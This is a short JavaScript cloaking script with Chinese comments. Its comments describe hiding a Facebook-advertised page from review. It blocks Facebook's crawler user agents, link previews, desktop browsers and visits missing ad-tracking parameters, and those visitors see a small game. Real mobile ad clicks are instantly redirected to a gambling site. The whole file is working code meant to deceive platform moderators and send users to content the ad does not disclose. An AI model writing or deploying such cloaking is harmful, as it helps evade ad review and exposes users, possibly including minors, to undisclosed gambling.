(function() {
    // 【配置：跳转目标地址】
    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6 "; 

    function isRealPlayer() {
        var search = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // --- 1. 占位符死刑（绝对拦截） ---
        // 只要链接中还残留 {{ 或编码后的 %7b%7b，说明是 FB 预览/审核，绝对不跳
        if (search.indexOf('%7b%7b') > -1 || search.indexOf('{{') > -1) return false;

        // --- 2. 核心字段完整性校验 ---
        // 必须同时具备以下 6 个参数：fbclid (真实点击证明) + 5个广告追踪参数
        var requiredKeys = ['fbclid=', 'pixel=', 'apkch=', 'campaign=', 'adgroup=', 'creative='];
        for (var i = 0; i < requiredKeys.length; i++) {
            if (search.indexOf(requiredKeys[i]) === -1) return false;
        }

        // --- 3. 环境过滤（防电脑审核） ---
        // 必须是移动端访问
        var isMobile = /iphone|ipad|ipod|android/.test(ua);
        if (!isMobile) return false;

        // 排除已知的爬虫 UA
        if (ua.indexOf('facebookexternalhit') > -1 || ua.indexOf('facebot') > -1) return false;

        // --- 4. 屏幕指纹 ---
        if (window.screen.width === 0 || window.innerHeight === 0) return false;

        return true; 
    }

    // --- 立即执行逻辑 ---
    if (isRealPlayer()) {
        // 拼接所有参数跳转
        var connector = config_target.indexOf('?') > -1 ? '&' : '?';
        var finalUrl = config_target + connector + window.location.search.substring(1);
        
        // 瞬间替换，不产生闪烁
        window.location.replace(finalUrl);
    } else {
        // 留在原地显示小游戏
        console.log("Verified: Game Content Loaded.");
        if (typeof init === 'function') init();
    }
})();
